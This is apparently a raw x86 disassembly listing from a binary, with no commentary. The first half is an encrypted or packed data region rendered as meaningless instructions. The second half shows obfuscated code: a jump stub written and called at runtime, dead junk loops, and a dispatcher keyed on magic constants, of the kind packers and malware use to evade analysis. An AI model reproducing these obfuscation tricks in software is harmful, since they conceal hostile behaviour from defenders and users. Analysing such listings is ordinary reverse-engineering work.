  416c70:	and    eax,DWORD PTR [ebp+0x2e]
  416c73:	adc    al,0xee
  416c75:	inc    edi
  416c76:	mov    dh,al
  416c78:	(bad)  
  416c7a:	add    DWORD PTR [ebp+0x493a7db1],0x4b90ca82
  416c84:	stc    
  416c85:	dec    ebx
  416c86:	mul    DWORD PTR [ebp+0x53]
  416c89:	fiadd  WORD PTR [eax-0x24]
  416c8c:	adc    esp,DWORD PTR [esi+0x79e9fbcc]
  416c92:	stos   DWORD PTR es:[edi],eax
  416c93:	(bad)  
  416c94:	in     al,dx
  416c95:	sbb    al,0xa5
  416c97:	call   ebx
  416c99:	(bad)  
  416c9b:	retf   
  416c9c:	sub    dh,BYTE PTR ss:[eax]
  416c9f:	dec    eax
  416ca0:	push   ss
  416ca1:	sbb    DWORD PTR [edx],ebx
  416ca3:	xchg   edx,eax
  416ca4:	inc    eax
  416ca5:	pop    ds
  416ca6:	cmp    eax,DWORD PTR [eax+0x768196cf]
  416cac:	cs jns 0x416cfb
  416caf:	popf   
  416cb0:	in     eax,dx
  416cb1:	push   edx
  416cb2:	icebp  
  416cb3:	push   0x63c2d652
  416cb8:	ror    DWORD PTR [ebx],0x90
  416cbb:	xor    bh,ah
  416cbd:	repnz push ebp
  416cbf:	push   ecx
  416cc0:	ins    BYTE PTR es:[edi],dx
  416cc1:	test   DWORD PTR [ebx],edi
  416cc3:	adc    dh,0x75
  416cc6:	icebp  
  416cc7:	scas   eax,DWORD PTR es:[edi]
  416cc8:	pop    esp
  416cc9:	mov    bl,0x4f
  416ccb:	fs push esp
  416ccd:	fadd   QWORD PTR [edi+0x4bb7ac4d]
  416cd3:	lahf   
  416cd4:	fwait
  416cd5:	sub    dh,BYTE PTR [ecx]
  416cd7:	pop    eax
  416cd8:	pusha  
  416cd9:	inc    edx
  416cda:	add    al,bh
  416cdc:	stos   BYTE PTR es:[edi],al
  416cdd:	mov    eax,ds:0x9c99c2a8
  416ce2:	jne    0x416cb5
  416ce4:	inc    eax
  416ce5:	xchg   ebx,eax
  416ce6:	bound  edx,QWORD PTR [edi]
  416ce8:	jns    0x416c70
  416cea:	test   DWORD PTR [ebx-0x461a0205],ebx
  416cf0:	imul   esi,DWORD PTR [edi],0x3d
  416cf3:	mov    esi,0xe0f9ce46
  416cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cf9:	cs loope 0x416cf5
  416cfc:	add    al,al
  416cfe:	xchg   edi,eax
  416cff:	std    
  416d00:	sahf   
  416d01:	ret    
  416d02:	ret    0x695f
  416d05:	add    ebp,eax
  416d07:	cmp    al,0x7c
  416d09:	daa    
  416d0a:	fisttp WORD PTR [esi-0x7f]
  416d0d:	push   es
  416d0e:	mov    bh,0x5e
  416d10:	das    
  416d11:	ds mov cs,edi
  416d14:	mov    DWORD PTR [esi],ebp
  416d16:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  416d19:	fstp   QWORD PTR [ebp+0x64b0037d]
  416d1f:	jbe    0x416ce0
  416d21:	xor    al,BYTE PTR [edx+ebp*8-0x448423f4]
  416d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d29:	pop    ss
  416d2a:	xor    ah,BYTE PTR [edi+0x2ef97f6]
  416d30:	and    ebp,DWORD PTR [edi+0x2a391d26]
  416d36:	sbb    esp,esp
  416d38:	push   0xffffffe6
  416d3a:	dec    esp
  416d3b:	test   BYTE PTR [ebp+0x16c93207],dh
  416d41:	add    al,0xb7
  416d43:	out    0x11,eax
  416d45:	scas   al,BYTE PTR es:[edi]
  416d46:	cld    
  416d47:	xor    dl,BYTE PTR [edi]
  416d49:	push   es
  416d4a:	repnz not BYTE PTR [esi+edx*8+0x20b9bf74]
  416d52:	cmp    BYTE PTR [esi+0x1635e3ee],0x68
  416d59:	jo     0x416d25
  416d5b:	cmp    eax,0x53c8af6e
  416d60:	jge    0x416d88
  416d62:	sbb    esp,DWORD PTR cs:[esi-0x6]
  416d66:	push   edi
  416d67:	mov    ah,0x5
  416d69:	push   ecx
  416d6a:	sar    DWORD PTR ds:0x88bea1bf,1
  416d70:	pushf  
  416d71:	mov    es,eax
  416d73:	xor    DWORD PTR [ebp-0x36],ebx
  416d76:	or     esp,DWORD PTR [edi]
  416d78:	cli    
  416d79:	cmp    DWORD PTR [esi],ebx
  416d7b:	pop    edx
  416d7c:	call   0xde8b3b8b
  416d81:	retf   0x37e6
  416d84:	mov    fs,WORD PTR [edi+0x61f120a6]
  416d8a:	sub    ch,bh
  416d8c:	push   eax
  416d8d:	leave  
  416d8e:	xor    dl,bh
  416d90:	mov    ecx,0xe04aaaf5
  416d95:	cld    
  416d96:	cmp    al,0xe8
  416d98:	or     edx,esp
  416d9a:	mov    ecx,0xfd386487
  416d9f:	jo     0x416d94
  416da1:	paddusb mm1,QWORD PTR [eax]
  416da4:	jbe    0x416d75
  416da6:	xlat   BYTE PTR ds:[ebx]
  416da7:	xor    ah,BYTE PTR [esi]
  416da9:	test   al,0xb8
  416dab:	inc    ebp
  416dac:	mov    edx,0x256490ba
  416db1:	cmc    
  416db2:	mov    al,0xe8
  416db4:	test   al,0x3
  416db6:	dec    ebp
  416db7:	push   es
  416db8:	(bad)  
  416db9:	arpl   WORD PTR [ebx+ebx*1+0x4c],di
  416dbd:	push   esi
  416dbe:	sub    al,0xf0
  416dc0:	mov    esp,0x930954d0
  416dc5:	fidivr WORD PTR [ecx]
  416dc7:	add    DWORD PTR [esi+0xcfdafbf],0x7a
  416dce:	mov    dh,0x56
  416dd0:	mov    edx,0x2746af95
  416dd5:	imul   ecx,DWORD PTR [edx],0xffffffc9
  416dd8:	ja     0x416d67
  416dda:	cdq    
  416ddb:	dec    edx
  416ddc:	les    edx,FWORD PTR [ebp-0x2be94839]
  416de2:	pop    ecx
  416de3:	jg     0x416d89
  416de5:	cmp    al,0x91
  416de7:	ins    BYTE PTR es:[edi],dx
  416de8:	mov    dh,0xe5
  416dea:	lock adc DWORD PTR [ecx+0x2b],0x68
  416def:	das    
  416df0:	sbb    eax,edx
  416df2:	in     al,0x23
  416df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df5:	and    al,ch
  416df7:	inc    eax
  416df8:	out    dx,eax
  416df9:	and    BYTE PTR [ebx+esi*1+0x5e],bl
  416dfd:	fisubr DWORD PTR [ebx]
  416dff:	sbb    DWORD PTR [ebx+0x20eeecd3],0x3f
  416e06:	adc    al,0x87
  416e08:	xor    ebp,DWORD PTR [eax+edi*2+0x7fc91da5]
  416e0f:	or     esi,DWORD PTR [edi+0x6e]
  416e12:	out    0x4a,eax
  416e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e15:	jle    0x416e23
  416e17:	imul   esp,DWORD PTR [esi+ebx*4+0x49],0xffffffb0
  416e1c:	pop    es
  416e1d:	or     esi,DWORD PTR [eax]
  416e1f:	stc    
  416e20:	test   BYTE PTR [esp+esi*1+0x2],ch
  416e24:	sahf   
  416e25:	inc    edi
  416e26:	mov    edx,0x7613ecf8
  416e2b:	fprem  
  416e2d:	(bad)  
  416e2e:	leave  
  416e2f:	nop
  416e30:	cmp    bh,0xab
  416e33:	lds    eax,FWORD PTR [ebx-0x38]
  416e36:	(bad)  [esp+ebx*4]
  416e39:	push   ss
  416e3a:	pop    ebx
  416e3b:	ds repz dec edi
  416e3e:	xlat   BYTE PTR ds:[ebx]
  416e3f:	pushf  
  416e40:	jge    0x416df2
  416e42:	rep lods al,BYTE PTR ds:[esi]
  416e44:	in     eax,0xa1
  416e46:	(bad)  
  416e47:	jmp    0x9a2396c4
  416e4c:	fwait
  416e4d:	sub    eax,0xa03e30be
  416e52:	pop    esi
  416e53:	cmp    BYTE PTR [edx-0x1e],ch
  416e56:	daa    
  416e57:	xor    al,0xea
  416e59:	test   DWORD PTR [eax],ebx
  416e5b:	xchg   esi,eax
  416e5c:	sbb    eax,0x8d051aa3
  416e61:	jbe    0x416e8d
  416e63:	inc    edi
  416e64:	push   ds
  416e65:	cmc    
  416e66:	shr    DWORD PTR [ecx+0x20120705],1
  416e6c:	pop    ecx
  416e6d:	loopne 0x416e38
  416e6f:	jmp    0xd451:0x2987f4d6
  416e76:	ss sti 
  416e78:	inc    eax
  416e79:	jbe    0x416e42
  416e7b:	sub    eax,0x91f728c5
  416e80:	ss aaa 
  416e82:	sti    
  416e83:	push   esi
  416e84:	pop    edx
  416e85:	pop    ebx
  416e86:	fwait
  416e87:	push   eax
  416e88:	fdivr  DWORD PTR [edx+0x22015022]
  416e8e:	xor    DWORD PTR [edi],ebp
  416e90:	mov    WORD PTR [edi+0x56f3b183],es
  416e96:	xlat   BYTE PTR ds:[ebx]
  416e97:	retf   0xf08a
  416e9a:	mov    al,0x90
  416e9c:	pop    ss
  416e9d:	ins    BYTE PTR es:[edi],dx
  416e9e:	cmp    dl,ah
  416ea0:	hlt    
  416ea1:	push   ebx
  416ea2:	out    dx,eax
  416ea3:	add    BYTE PTR [bp+di+0x3c3d],ch
  416ea8:	mov    BYTE PTR [ebx],bl
  416eaa:	sbb    BYTE PTR es:[ebp-0x30],ah
  416eae:	pop    ecx
  416eaf:	push   ss
  416eb0:	inc    ebx
  416eb1:	push   ss
  416eb2:	cmp    dl,BYTE PTR [ebx-0x62]
  416eb5:	push   cs
  416eb6:	sub    cl,BYTE PTR [edx]
  416eb8:	test   BYTE PTR [esi+edi*8],al
  416ebb:	xor    BYTE PTR [ebx+0x2b],dh
  416ebe:	push   edi
  416ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ec1:	test   DWORD PTR [esi+0x1591a28d],edx
  416ec7:	xchg   al,cl
  416ec9:	mov    eax,0xb76e442a
  416ece:	into   
  416ecf:	ins    BYTE PTR es:[edi],dx
  416ed0:	in     al,0xa9
  416ed2:	dec    esi
  416ed3:	pop    esp
  416ed4:	mov    DWORD PTR [ebx-0x72],0x7440854d
  416edb:	pop    esi
  416edc:	and    al,0xf9
  416ede:	(bad)  
  416edf:	in     eax,dx
  416ee0:	lea    esi,[ebx]
  416ee2:	xor    ah,bl
  416ee4:	add    eax,0xe0808d75
  416ee9:	jnp    0x416ea8
  416eeb:	push   esp
  416eec:	cld    
  416eed:	xor    bl,bl
  416eef:	out    0x54,al
  416ef1:	(bad)  
  416ef2:	(bad)  
  416ef3:	push   eax
  416ef4:	jb     0x416e9b
  416ef6:	add    BYTE PTR [eax+edi*4],bl
  416ef9:	aad    0x45
  416efb:	mov    BYTE PTR [eax*1+0x4b9c5d46],dl
  416f02:	mov    cl,0xd5
  416f04:	cwde   
  416f05:	or     DWORD PTR [edx+0x64],0x757ae43
  416f0c:	aam    0x56
  416f0e:	dec    eax
  416f0f:	sbb    eax,0x72498c66
  416f14:	xor    al,0xae
  416f16:	push   ss
  416f17:	inc    eax
  416f18:	bound  edx,QWORD PTR [ebx+0x540a46f1]
  416f1e:	fcom   QWORD PTR [ebp-0x70a29197]
  416f24:	pop    ebx
  416f25:	shl    edi,0xc0
  416f28:	dec    esi
  416f29:	cs cwde 
  416f2b:	sub    edx,esp
  416f2d:	pop    ebp
  416f2e:	call   0x5932:0xf61f5599
  416f35:	pop    ds
  416f36:	jmp    0x1e48d888
  416f3b:	mov    bl,0x9b
  416f3d:	loopne 0x416f2c
  416f3f:	fistp  QWORD PTR [esi+0x104970f]
  416f45:	jnp    0x416f29
  416f47:	popf   
  416f48:	lods   al,BYTE PTR ds:[esi]
  416f49:	fstp   QWORD PTR ds:0x65c040b4
  416f4f:	retf   0xf525
  416f52:	inc    esi
  416f53:	ins    DWORD PTR es:[edi],dx
  416f54:	shr    edx,1
  416f56:	jbe    0x416ef1
  416f58:	or     cl,BYTE PTR [edi-0x60]
  416f5b:	jno    0x416ef4
  416f5d:	imul   BYTE PTR [ecx-0x5f6a9d32]
  416f63:	cmp    ebp,DWORD PTR [edi]
  416f65:	or     BYTE PTR [edx-0x767ed302],ch
  416f6b:	push   ss
  416f6c:	pop    eax
  416f6d:	and    al,0xe1
  416f6f:	xchg   BYTE PTR [esi],dl
  416f71:	jae    0x416fd1
  416f73:	mov    dl,0xd4
  416f75:	mov    ebx,0xea1d7ec9
  416f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f7b:	pop    edx
  416f7c:	sbb    al,0xc8
  416f7e:	aad    0xd1
  416f80:	cs scas eax,DWORD PTR es:[edi]
  416f82:	xchg   edx,eax
  416f83:	cmc    
  416f84:	cmp    DWORD PTR [esi-0x67f14ed7],esp
  416f8a:	jmp    0x416f6d
  416f8c:	xor    DWORD PTR [edi-0x66e72550],esp
  416f92:	cmp    bh,dl
  416f94:	jb     0x416f6d
  416f96:	pop    ecx
  416f97:	cwde   
  416f98:	sub    esi,DWORD PTR [ecx+ecx*4]
  416f9b:	pop    esp
  416f9c:	sbb    BYTE PTR [ecx],cl
  416f9e:	jge    0x416f83
  416fa0:	cmp    dl,al
  416fa2:	fstp   TBYTE PTR [ebp+0x5ae65bc]
  416fa8:	mov    WORD PTR [edx+0x189b17a0],cs
  416fae:	jnp    0x417020
  416fb0:	in     eax,0x38
  416fb2:	cs jecxz 0x416f63
  416fb5:	call   0xf04b:0xd505e76f
  416fbc:	iret   
  416fbd:	inc    ecx
  416fbe:	mov    dh,BYTE PTR [ebp-0x473dc102]
  416fc4:	lock xchg ebx,eax
  416fc6:	inc    ecx
  416fc7:	xchg   edi,eax
  416fc8:	fnstsw WORD PTR [eax+0x38e4d7df]
  416fce:	mov    esp,0x18662f3a
  416fd3:	out    dx,al
  416fd4:	dec    ecx
  416fd5:	out    0xa5,al
  416fd7:	cmp    eax,0x60b7474f
  416fdc:	loope  0x416fbf
  416fde:	mov    cs,edi
  416fe0:	sbb    DWORD PTR [esi+0x67],eax
  416fe3:	loop   0x416fd5
  416fe5:	invd   
  416fe7:	lds    esp,FWORD PTR [ebp+0x13]
  416fea:	mov    ah,0xdf
  416fec:	pop    ecx
  416fed:	jecxz  0x41703f
  416fef:	jge    0x416fcc
  416ff1:	call   0xce86335e
  416ff6:	dec    edx
  416ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff8:	mov    cl,bl
  416ffa:	cdq    
  416ffb:	iret   
  416ffc:	popa   
  416ffd:	xchg   ebx,eax
  416ffe:	jg     0x416ffc
  417000:	cmp    bl,BYTE PTR [edi]
  417002:	xor    eax,0xfbee486c
  417007:	inc    esp
  417008:	outs   dx,BYTE PTR ds:[esi]
  417009:	ja     0x416fce
  41700b:	test   eax,0x6c21a1ba
  417010:	jbe    0x417082
  417012:	scas   al,BYTE PTR es:[edi]
  417013:	mov    esi,0x35d83a02
  417018:	enter  0x1ccd,0x72
  41701c:	imul   ebx,DWORD PTR [edx+0x6a],0x7244d2a8
  417023:	xor    BYTE PTR ds:0x14811eba,cl
  417029:	icebp  
  41702a:	sbb    cl,ah
  41702c:	or     al,0xc9
  41702e:	pop    ecx
  41702f:	call   0xf2ace4bc
  417034:	mov    bl,0x63
  417036:	mov    ebx,0xddbcb26f
  41703b:	add    BYTE PTR [edx-0x32],al
  41703e:	stos   DWORD PTR es:[edi],eax
  41703f:	lods   al,BYTE PTR ds:[esi]
  417041:	dec    ecx
  417042:	test   al,0xc1
  417044:	cmp    al,0xd5
  417046:	cwde   
  417047:	mov    dl,0xa9
  417049:	loop   0x417076
  41704b:	fdivr  DWORD PTR [edx-0x33]
  41704e:	sub    ch,ah
  417050:	mov    dh,0x44
  417052:	shl    BYTE PTR [edi-0x3690cb7b],1
  417058:	mov    ebx,0x973e78cb
  41705d:	fstp   TBYTE PTR [eax+0x313572f2]
  417063:	retf   0xc9e8
  417066:	pop    ss
  417067:	pop    ecx
  417068:	pop    edi
  417069:	jmp    0x79c3dd4d
  41706e:	out    dx,eax
  41706f:	ins    DWORD PTR es:[edi],dx
  417070:	dec    esp
  417071:	xor    eax,0x99d92692
  417076:	enter  0xa591,0xd5
  41707a:	add    esi,edx
  41707c:	test   BYTE PTR [edx-0x3a],0xd7
  417080:	and    BYTE PTR [edx-0x249a57d8],dl
  417086:	push   0x53
  417088:	xchg   esi,eax
  417089:	mov    edx,0x9fa1d777
  41708e:	aam    0x54
  417090:	mov    ecx,0xc897a2b0
  417095:	inc    ecx
  417096:	or     al,0x22
  417098:	jecxz  0x4170bd
  41709a:	cmp    eax,0x8045771b
  41709f:	cmc    
  4170a0:	adc    edi,DWORD PTR [esi]
  4170a2:	lods   al,BYTE PTR ds:[esi]
  4170a3:	jl     0x4170a7
  4170a5:	xchg   ebx,eax
  4170a6:	xor    ebp,ecx
  4170a8:	(bad)  
  4170a9:	xlat   BYTE PTR ds:[ebx]
  4170aa:	mov    al,0x2c
  4170ac:	sub    eax,0xad92a8b2
  4170b1:	jecxz  0x4170ea
  4170b3:	and    ah,ah
  4170b5:	sub    BYTE PTR [ecx+eax*4-0x74d16638],bl
  4170bc:	cmp    DWORD PTR [ebx-0x6a],ecx
  4170bf:	jno    0x417076
  4170c1:	cmp    eax,0x8cf2bdb5
  4170c6:	cli    
  4170c7:	sbb    dl,BYTE PTR [esi]
  4170c9:	retf   
  4170ca:	pop    ebx
  4170cb:	xchg   edx,eax
  4170cc:	aaa    
  4170cd:	popa   
  4170ce:	stos   DWORD PTR es:[edi],eax
  4170cf:	cmp    al,0x42
  4170d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170d2:	inc    ebx
  4170d3:	or     bl,BYTE PTR [eax+0x69cf5c1c]
  4170d9:	adc    esp,edx
  4170db:	mov    esi,ebp
  4170dd:	push   0x42
  4170df:	mov    eax,ds:0xec4f1e49
  4170e4:	stos   BYTE PTR es:[edi],al
  4170e5:	jmp    edx
  4170e7:	dec    esi
  4170e8:	gs jns 0x4170ad
  4170eb:	out    0x34,eax
  4170ed:	pop    ss
  4170ee:	lea    esi,[edi+0x1f2b3aa1]
  4170f4:	sub    eax,0xabc4806e
  4170f9:	test   DWORD PTR [ebx+0x35],edx
  4170fc:	(bad)  
  4170fd:	mov    bl,0xc3
  4170ff:	lock sub DWORD PTR [esi+0x25],ecx
  417103:	test   al,0xfd
  417105:	dec    eax
  417106:	or     cl,BYTE PTR [edx+0x7b3101cf]
  41710c:	pop    ecx
  41710d:	mov    DWORD PTR [edx+ebx*2-0x4c9703ae],esp
  417114:	lods   eax,DWORD PTR ds:[esi]
  417115:	dec    ebp
  417116:	sbb    eax,0x26074dc3
  41711b:	sbb    DWORD PTR [ecx],edx
  41711d:	and    eax,0xb6fc21a5
  417122:	jp     0x41714f
  417124:	ror    DWORD PTR [ecx+0x4d8bf845],0xfc
  41712b:	xor    ecx,esi
  41712d:	mov    eax,0xffcd8d08
  417132:	sub    eax,ecx
  417134:	add    DWORD PTR [ebp-0x8],eax
  417137:	mov    eax,DWORD PTR [ebp-0x14]
  41713a:	mov    DWORD PTR [eax],0x675565e9
  417140:	mov    DWORD PTR [eax+0x4],0x76576787
  417147:	mov    eax,DWORD PTR [ebp-0x8]
  41714a:	mov    ecx,DWORD PTR [ebp-0x14]
  41714d:	push   DWORD PTR [ebp-0x24]
  417150:	mov    DWORD PTR [ecx+0x1],eax
  417153:	mov    eax,ds:0x4281e1
  417158:	push   DWORD PTR [eax]
  41715a:	push   DWORD PTR ds:0x428445
  417160:	push   DWORD PTR ds:0x4281e9
  417166:	push   DWORD PTR ds:0x428425
  41716c:	push   DWORD PTR ds:0x428c15
  417172:	push   DWORD PTR [ebp-0x28]
  417175:	push   DWORD PTR [ebp-0x2c]
  417178:	mov    eax,DWORD PTR [ebp-0x14]
  41717b:	call   eax
  41717d:	pop    edi
  41717e:	pop    esi
  41717f:	leave  
  417180:	ret    
  417181:	push   ebp
  417182:	mov    ebp,esp
  417184:	sub    esp,0x34
  417187:	add    DWORD PTR ds:0x428e9d,ebx
  41718d:	push   ebx
  41718e:	push   esi
  41718f:	movzx  esi,WORD PTR ds:0x428e39
  417196:	or     DWORD PTR ds:0x428e31,esi
  41719c:	push   edi
  41719d:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  4171a4:	lea    eax,[ebp+0x14]
  4171a7:	mov    DWORD PTR [ebp-0x4],eax
  4171aa:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  4171b1:	sub    ecx,DWORD PTR ds:0x428eb9
  4171b7:	lea    eax,[ebp-0xc]
  4171ba:	xor    edx,ecx
  4171bc:	mov    DWORD PTR [ebp-0x14],eax
  4171bf:	and    DWORD PTR ds:0x428e39,0x0
  4171c9:	jmp    0x4171db
  4171ce:	mov    ecx,DWORD PTR ds:0x428e39
  4171d4:	inc    ecx
  4171d5:	mov    DWORD PTR ds:0x428e39,ecx
  4171db:	cmp    DWORD PTR ds:0x428e39,0x18
  4171e2:	jae    0x417215
  4171e8:	cmp    DWORD PTR ds:0x428e39,0x1b
  4171ef:	jbe    0x417215
  4171f5:	jmp    0x417210
  4171fa:	push   0x39b5
  4171ff:	push   DWORD PTR [ebp-0x14]
  417202:	push   DWORD PTR [ebp-0x14]
  417205:	push   0x5237
  41720a:	call   DWORD PTR ds:0x42ca3c
  417210:	jmp    0x4171ce
  417215:	mov    eax,DWORD PTR [ebp-0xc]
  417218:	mov    edx,DWORD PTR [ebp-0x14]
  41721b:	or     DWORD PTR ds:0x428e85,edx
  417221:	mov    ecx,0x75108b1
  417226:	xor    eax,ecx
  417228:	dec    DWORD PTR ds:0x428e85
  41722e:	add    eax,0x3272f8
  417233:	and    DWORD PTR ds:0x428eb5,0x0
  41723d:	jmp    0x41724f
  417242:	mov    esi,DWORD PTR ds:0x428eb5
  417248:	inc    esi
  417249:	mov    DWORD PTR ds:0x428eb5,esi
  41724f:	cmp    DWORD PTR ds:0x428eb5,0x19
  417256:	jae    0x41729d
  41725c:	cmp    DWORD PTR ds:0x428eb5,0x9
  417263:	jl     0x41729d
  417269:	jmp    0x41727e
  41726e:	push   0x428019
  417273:	push   0x1
  417275:	push   DWORD PTR [ebp-0x24]
  417278:	call   DWORD PTR ds:0x42ca4c
  41727e:	cmp    DWORD PTR ds:0x428eb5,0x8
  417285:	jne    0x417298
  41728b:	mov    esi,DWORD PTR ds:0x428eb5
  417291:	inc    esi
  417292:	mov    DWORD PTR ds:0x428eb5,esi
  417298:	jmp    0x417242
  41729d:	mov    DWORD PTR [edx],eax
  41729f:	mov    eax,ds:0x4281dd
  4172a4:	mov    edx,DWORD PTR [ebp-0x4]
  4172a7:	mov    eax,DWORD PTR [eax]
  4172a9:	mov    DWORD PTR ds:0x428ecd,0x15
  4172b3:	cmp    DWORD PTR ds:0x428ecd,0x0
  4172ba:	je     0x417309
  4172c0:	cmp    DWORD PTR ds:0x428ecd,0x6
  4172c7:	jg     0x417309
  4172cd:	jmp    0x4172dd
  4172d2:	push   0x50d0
  4172d7:	call   DWORD PTR ds:0x42ca50
  4172dd:	cmp    DWORD PTR ds:0x428ecd,0x7
  4172e4:	jne    0x4172f7
  4172ea:	mov    esi,DWORD PTR ds:0x428ecd
  4172f0:	dec    esi
  4172f1:	mov    DWORD PTR ds:0x428ecd,esi
  4172f7:	mov    esi,DWORD PTR ds:0x428ecd
  4172fd:	dec    esi
  4172fe:	mov    DWORD PTR ds:0x428ecd,esi
  417304:	jmp    0x4172b3
  417309:	add    eax,DWORD PTR [edx]
  41730b:	mov    DWORD PTR [ebp-0x8],eax
  41730e:	mov    esi,DWORD PTR [ebp+0x8]
  417311:	sbb    DWORD PTR ds:0x428e71,ebx
  417317:	mov    eax,ds:0x428365
  41731c:	mov    DWORD PTR ds:0x428e8d,0x5de4
  417326:	mov    eax,DWORD PTR [eax+0x198]
  41732c:	and    DWORD PTR ds:0x428eb1,0x0
  417336:	jmp    0x417348
  41733b:	mov    edx,DWORD PTR ds:0x428eb1
  417341:	inc    edx
  417342:	mov    DWORD PTR ds:0x428eb1,edx
  417348:	cmp    DWORD PTR ds:0x428eb1,0x1b
  41734f:	jae    0x41737f
  417355:	cmp    DWORD PTR ds:0x428eb1,0x26
  41735c:	jle    0x41737f
  417362:	jmp    0x41737a
  417367:	push   DWORD PTR [ebp-0x14]
  41736a:	push   0x42819a
  41736f:	push   0x428e5d
  417374:	call   DWORD PTR ds:0x42ca54
  41737a:	jmp    0x41733b
  41737f:	xor    esi,ecx
  417381:	and    DWORD PTR ds:0x428ec1,0x0
  41738b:	jmp    0x41739d
  417390:	mov    edx,DWORD PTR ds:0x428ec1
  417396:	inc    edx
  417397:	mov    DWORD PTR ds:0x428ec1,edx
  41739d:	cmp    DWORD PTR ds:0x428ec1,0x1c
  4173a4:	jae    0x4173f1
  4173aa:	cmp    DWORD PTR ds:0x428ec1,0x8
  4173b1:	jb     0x4173f1
  4173b7:	jmp    0x4173d2
  4173bc:	push   DWORD PTR [ebp-0x24]
  4173bf:	push   0x14a9
  4173c4:	push   0x3838
  4173c9:	push   DWORD PTR [ebp-0x20]
  4173cc:	call   DWORD PTR ds:0x42ca58
  4173d2:	cmp    DWORD PTR ds:0x428ec1,0x7
  4173d9:	jne    0x4173ec
  4173df:	mov    edx,DWORD PTR ds:0x428ec1
  4173e5:	inc    edx
  4173e6:	mov    DWORD PTR ds:0x428ec1,edx
  4173ec:	jmp    0x417390
  4173f1:	mov    edx,0x3272f8
  4173f6:	or     DWORD PTR ds:0x428e59,0x2d0a
  417400:	add    esi,edx
  417402:	mov    DWORD PTR ds:0x428e4d,0x9a6
  41740c:	cmp    DWORD PTR [eax],esi
  41740e:	mov    DWORD PTR ds:0x428e65,0x2339
  417418:	je     0x41742f
  41741e:	mov    eax,DWORD PTR [eax]
  417420:	mov    DWORD PTR ds:0x428ebd,0x152e
  41742a:	jmp    0x41e3db
  41742f:	sbb    esi,eax
  417431:	mov    eax,DWORD PTR [ebp+0x18]
  417434:	mov    esi,DWORD PTR ds:0x428e2d
  41743a:	adc    DWORD PTR ds:0x428e61,esi
  417440:	mov    esi,DWORD PTR [ebp+0x1c]
  417443:	or     ebx,0xffffffff
  417446:	mov    DWORD PTR ds:0x428ed1,0x15d
  417450:	cmp    eax,0x70941f8a
  417455:	mov    DWORD PTR ds:0x428e8d,0x42c3
  41745f:	jne    0x4174aa
  417465:	mov    DWORD PTR ds:0x428e2d,0x1eb5
  41746f:	cmp    esi,ebx
  417471:	mov    DWORD PTR ds:0x428ead,0x35c3
  41747b:	jne    0x4174aa
  417481:	mov    DWORD PTR ds:0x428e65,0x33a3
  41748b:	push   ebx
  41748c:	mov    DWORD PTR ds:0x428e49,0x2fe2
  417496:	push   0x70941f94
  41749b:	mov    DWORD PTR ds:0x428e41,0x2336
  4174a5:	jmp    0x41e3ca
  4174aa:	mov    DWORD PTR ds:0x428ea5,ebx
  4174b0:	mov    eax,DWORD PTR [ebp+0x18]
  4174b3:	mov    esi,DWORD PTR [ebp+0x1c]
  4174b6:	cmp    eax,0x70941f94
  4174bb:	mov    DWORD PTR ds:0x428e61,0x2bd8
  4174c5:	jne    0x4174f2
  4174cb:	cmp    esi,ebx
  4174cd:	mov    DWORD PTR ds:0x428e2d,0x15b3
  4174d7:	jne    0x4174f2
  4174dd:	push   ebx
  4174de:	mov    DWORD PTR ds:0x428e75,0x4e72
  4174e8:	push   0x70941f96
  4174ed:	jmp    0x41e3ca
  4174f2:	mov    eax,ds:0x428e59
  4174f7:	mov    eax,DWORD PTR [ebp+0x18]
  4174fa:	mov    esi,DWORD PTR [ebp+0x1c]
  4174fd:	cmp    eax,0x70941f96
  417502:	jne    0x417543
  417508:	mov    DWORD PTR ds:0x428e99,0x434f
  417512:	cmp    esi,ebx
  417514:	jne    0x417543
  41751a:	mov    DWORD PTR ds:0x428ec9,0x341e
  417524:	push   ebx
  417525:	mov    DWORD PTR ds:0x428e85,0x3720
  41752f:	push   0x70941f90
  417534:	mov    DWORD PTR ds:0x428eb1,0x674c
  41753e:	jmp    0x41e3ca
  417543:	mov    eax,DWORD PTR [ebp+0x18]
  417546:	mov    esi,DWORD PTR [ebp+0x1c]
  417549:	mov    DWORD PTR ds:0x428e69,0x6330
  417553:	cmp    eax,0x70941f90
  417558:	jne    0x417599
  41755e:	cmp    esi,ebx
  417560:	mov    DWORD PTR ds:0x428e45,0x5688
  41756a:	jne    0x417599
  417570:	mov    DWORD PTR ds:0x428e69,0x61b3
  41757a:	push   ebx
  41757b:	mov    DWORD PTR ds:0x428e4d,0x6bb8
  417585:	push   0x70941f92
  41758a:	mov    DWORD PTR ds:0x428e2d,0x777c
  417594:	jmp    0x41e3ca
  417599:	mov    eax,DWORD PTR [ebp+0x18]
  41759c:	mov    edi,DWORD PTR ds:0x428e89
  4175a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4175a5:	mov    edi,0x70941f9e
  4175aa:	mov    DWORD PTR ds:0x428ea1,0x2f43
  4175b4:	cmp    eax,edi
  4175b6:	mov    DWORD PTR ds:0x428eb1,0x498f
  4175c0:	jne    0x41e38b
  4175c6:	cmp    esi,ebx
  4175c8:	mov    DWORD PTR ds:0x428e71,0x5df9
  4175d2:	jne    0x41e38b
  4175d8:	sbb    eax,eax
  4175da:	mov    eax,DWORD PTR [ebp+0x10]
  4175dd:	and    DWORD PTR ds:0x428ea9,0x0
  4175e7:	jmp    0x4175fb
  4175ec:	xor    esi,esi
  4175ee:	xor    esi,DWORD PTR ds:0x428ea9
  4175f4:	inc    esi
  4175f5:	mov    DWORD PTR ds:0x428ea9,esi
  4175fb:	cmp    DWORD PTR ds:0x428ea9,0x1f
  417602:	jae    0x417655
  417608:	cmp    DWORD PTR ds:0x428ea9,0x5
  41760f:	jge    0x417655
  417615:	jmp    0x417636
  41761a:	push   DWORD PTR [ebp-0x10]
  41761d:	push   DWORD PTR [ebp-0x24]
  417620:	push   DWORD PTR [ebp-0x28]
  417623:	push   0x8725
  417628:	push   0x42814e
